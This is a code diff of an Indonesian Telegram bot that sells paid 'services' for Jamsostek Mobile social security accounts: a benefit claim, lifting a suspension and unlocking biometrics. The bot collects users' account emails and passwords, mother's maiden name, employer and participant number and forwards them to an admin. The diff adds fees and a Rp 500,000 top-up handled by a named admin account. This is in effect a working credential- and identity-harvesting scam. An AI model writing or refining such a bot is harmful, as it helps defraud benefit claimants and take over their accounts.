@@ -27,6 +27,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
 📋 KLAIM JMO TROUBLESHOOTING
 
+Pilihan : 
+*=>>Kode 040 Harga Rp 450.000
+*=>>Suspend Nomor KPJ Rp 300.000
+*=>>Unlock Biometrik Rp 350.000
+
 Pilih layanan yang Anda butuhkan:
 """
     
@@ -52,9 +57,12 @@ async def choose_service(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 ║      📱 KODE 040 - CLAIM PROCESS      ║
 ╚═══════════════════════════════════════╝
 
-Proses klaim JMO dengan Kode 040
-
-✅ Langkah 1: Login Akun Jamsostek Mobile
+*[Login akun Jamsostek Mobile]
+*[Masukan Email dan Password Jamsostek Mobile]
+* [Klaim Langsung]
+* [Isi Tahun KPJ]
+* [Proses .... 60menit]
+* [Mohon Menunggu....]
 
 Silakan masukkan EMAIL Jamsostek Mobile Anda:
 """
@@ -68,9 +76,11 @@ Silakan masukkan EMAIL Jamsostek Mobile Anda:
 ║    🔐 SUSPEND NOMOR KPJ - PROCESS     ║
 ╚═══════════════════════════════════════╝
 
-Proses melepas suspend pada nomor KPJ
-
-✅ Langkah 1: Login Akun Jamsostek Mobile
+*[Login akun Jamsostek Mobile]
+*[Masukan Email dan Password Jamsostek Mobile]
+*[Tombol Lepas Suspend]
+*[Proses .... 45menit]
+*[Mohon Menunggu]
 
 Silakan masukkan EMAIL Jamsostek Mobile Anda:
 """
@@ -84,9 +94,10 @@ Silakan masukkan EMAIL Jamsostek Mobile Anda:
 ║    🔓 UNLOCK BIOMETRIK - PROCESS      ║
 ╚═══════════════════════════════════════╝
 
-Proses unlock biometrik Jamsostek
-
-✅ Langkah 1: Identitas Diri
+*[Masukan Nama Ibu Kandung]
+*[Masukan Nama Perusahaan]
+*[Masukan Gmail Aktif]
+*[Masukan Nomor Peserta]
 
 Silakan masukkan NAMA IBU KANDUNG Anda:
 """
@@ -114,7 +125,7 @@ async def kode_040_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     context.user_data['email'] = email
     
     response_text = """
-✅ Langkah 2: Masukkan Password
+✅ Langkah berikutnya:
 
 Silakan masukkan PASSWORD Jamsostek Mobile Anda:
 """
@@ -127,7 +138,7 @@ async def kode_040_password(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     context.user_data['password'] = password
     
     response_text = """
-✅ Langkah 3: Klaim Langsung
+✅ Langkah berikutnya:
 
 Silakan masukkan TAHUN KPJ yang akan diklaim:
 (Contoh: 2023, 2024)
@@ -185,7 +196,7 @@ async def suspend_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     context.user_data['email'] = email
     
     response_text = """
-✅ Langkah 2: Masukkan Password
+✅ Langkah berikutnya:
 
 Silakan masukkan PASSWORD Jamsostek Mobile Anda:
 """
@@ -237,7 +248,7 @@ async def unlock_ibu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data['nama_ibu'] = nama_ibu
     
     response_text = """
-✅ Langkah 2: Nama Perusahaan
+✅ Langkah berikutnya:
 
 Silakan masukkan NAMA PERUSAHAAN Anda:
 """
@@ -255,7 +266,7 @@ async def unlock_perusahaan(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     context.user_data['nama_perusahaan'] = nama_perusahaan
     
     response_text = """
-✅ Langkah 3: Alamat Email
+✅ Langkah berikutnya:
 
 Silakan masukkan GMAIL AKTIF Anda:
 """
@@ -273,7 +284,7 @@ async def unlock_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     context.user_data['email'] = gmail
     
     response_text = """
-✅ Langkah 4: Nomor Peserta
+✅ Langkah terakhir:
 
 Silakan masukkan NOMOR PESERTA Jamsostek Anda:
 (13 digit, contoh: 1234567890123)
@@ -347,8 +358,6 @@ async def prepare_summary(user_data):
 """
     
     summary += """
-🎯 <b>Admin akan menghubungi Anda segera</b>
-
 💡 Tekan /start untuk kembali ke menu utama
 """
     
@@ -374,7 +383,7 @@ async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📋 <b>LAYANAN:</b> {service}
 
 """
-    
+
     if service == 'Kode 040':
         admin_message += f"""📝 <b>DATA KODE 040:</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -383,7 +392,7 @@ async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Tahun KPJ: {user_data.get('tahun', 'N/A')}
 • Status Proses: ⏳ 60 menit
 """
-    
+
     elif service == 'Suspend Nomor KPJ':
         admin_message += f"""📝 <b>DATA SUSPEND KPJ:</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -391,7 +400,7 @@ async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Password: {'*' * max(1, len(str(user_data.get('password', ''))))}
 • Status Proses: ⏳ 45 menit
 """
-    
+
     elif service == 'Unlock Biometrik':
         admin_message += f"""📝 <b>DATA UNLOCK BIOMETRIK:</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -400,12 +409,12 @@ async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Gmail Aktif: {user_data.get('email', 'N/A')}
 • Nomor Peserta: {user_data.get('nomor_peserta', 'N/A')}
 """
-    
+
     admin_message += """
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ Silakan segera hubungi user ini!
 """
-    
+
     try:
         await context.bot.send_message(
             chat_id=ADMIN_ID,
@@ -417,7 +426,7 @@ async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Error sending message to admin: {e}")
 
 async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show help information"""
+    """Show help information including balance info"""
     help_text = """
 ╔═══════════════════════════════════════╗
 ║        🆘 BANTUAN & INFORMASI        ║
@@ -425,20 +434,30 @@ async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>📌 LAYANAN YANG TERSEDIA:</b>
 
-<b>1️⃣ KODE 040</b>
-   ├─ Untuk klaim benefit dengan Kode 040
-   ├─ Waktu proses: 60 menit
-   └─ Persyaratan: Email & Password Jamsostek Mobile
+<b>1️⃣ KODE 040 - Rp 450.000</b>
+   *[Login akun Jamsostek Mobile]
+   *[Masukan Email dan Password Jamsostek Mobile]
+   * [Klaim Langsung]
+   * [Isi Tahun KPJ]
+   * [Proses .... 60menit]
+   * [Mohon Menunggu....]
 
-<b>2️⃣ SUSPEND NOMOR KPJ</b>
-   ├─ Untuk melepas suspend pada nomor KPJ
-   ├─ Waktu proses: 45 menit
-   └─ Persyaratan: Email & Password Jamsostek Mobile
+<b>2️⃣ SUSPEND NOMOR KPJ - Rp 300.000</b>
+   *[Login akun Jamsostek Mobile]
+   *[Masukan Email dan Password Jamsostek Mobile]
+   *[Tombol Lepas Suspend]
+   *[Proses .... 45menit]
+   *[Mohon Menunggu]
 
-<b>3️⃣ UNLOCK BIOMETRIK</b>
-   ├─ Untuk membuka kunci biometrik
-   ├─ Waktu proses: Segera
-   └─ Persyaratan: Nama Ibu, Perusahaan, Gmail, No. Peserta
+<b>3️⃣ UNLOCK BIOMETRIK - Rp 350.000</b>
+   *[Masukan Nama Ibu Kandung]
+   *[Masukan Nama Perusahaan]
+   *[Masukan Gmail Aktif]
+   *[Masukan Nomor Peserta]
+
+<b>💰 ISI SALDO:</b>
+• Isi saldo minimal Rp 500.000
+• Setiap isi saldo, fitur persetujuan ada di admin @play1990
 
 <b>📱 PERINTAH YANG TERSEDIA:</b>
 /start - Kembali ke menu utama
